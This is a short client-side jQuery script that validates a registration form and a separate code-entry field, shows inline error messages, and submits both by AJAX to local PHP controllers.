$(function(){
    $('#sub').on('click', function(event){
        event.preventDefault();
        let user = $('#user');
        let pass = $('#pass');
        let confirm = $('#confirm');
        let email = $('#email');

        if(user.val() === ''){
            
            $('#user_er').html("<span style='color: red; display: block'>This Field is required</span>");
        }else{    
            user = user.val();
            $('#user_er').html('');    
        }
        if(pass.val() === ''){
            $('#pass_er').html("<span style='color: red; display: block'>This Field is required</span>")
        }else{    
            pass = pass.val();
            $('#pass_er').html('');    
        }
        if(confirm.val() === ''){
           $('#confirm_er').html("<span style='color: red; display: block'>This Field is required</span>")
        } else{ 
            $('#confirm_er').html(''); 
        }
        if(confirm.val() !== pass){
            $('#confirm_er').html("<span style='color: red; display: block'>Passwords do not match</span>")   
        }else{    
            confirm = confirm.val();
            $('#confirm_er').html('');    
        }
        if(email.val() === ''){
            $('#email_er').html("<span style='color: red; display: block'>This Field is required</span>")
        }else{    
            email = email.val();
            $('#email_er').html('');    
        }
        if(user !== '' && pass !== '' && confirm !== '' && email !== ''){
            $.ajax({
                url: './controller/process.php',
                type: 'POST',
                data: {
                    user:user,
                    pass:pass,
                    email:email
                },
                beforeSend: function(){
                    $('#sub').html('<div class="spinner-border text-primary" role="status"></div>')
                },
                success: function(response){
                    if(response === 'success'){
                        alert('data submited Successfully');
                        window.location.href = './index.php';
                    }else{
                        alert("data could not be submited")
                    }
                },
                complete: function(){
                    $('#sub').removeClass('loader')
                    $('#sub').text("Submit")
                }
                    
            })
        }
    })
})

$(function(){
    $('#cont').on('click', function(e){
        e.preventDefault();
        let code = $('#codeInput');
        if(code.val() == ''){
            $('#code_er').html("<span style='color: red; display: block'>This Field is required</span>")
        }else{
            code = code.val();
            $("#code_er").html('');
        }
        if(code !== ''){
            $.ajax({
                url: './controller/bank.php',
                type: 'POST',
                data: {code: code},
                beforeSend: function(){
                    $('#cont').html("loading..")
                },
                success: function(success){
                    if(success === 'success'){
                        alert('data submited Successfully');
                        window.location.href = './index.php';
                    }else{
                        alert("failed")
                    }
                    
                },
                complete: function(){
                    $('#cont').text("Continue")
                }
            })
        }
       
       
    })
    return;

})


let forShow = document.getElementById("form-show");
let countBtn = document.getElementById('count');
countBtn.addEventListener('click', ()=>{
    let label = document.createElement('label');
    label.textContent = "enter Code here";
    let spanBtn = document.getElementById('count_er')
    spanBtn.appendChild(label);
    console.log(label)
})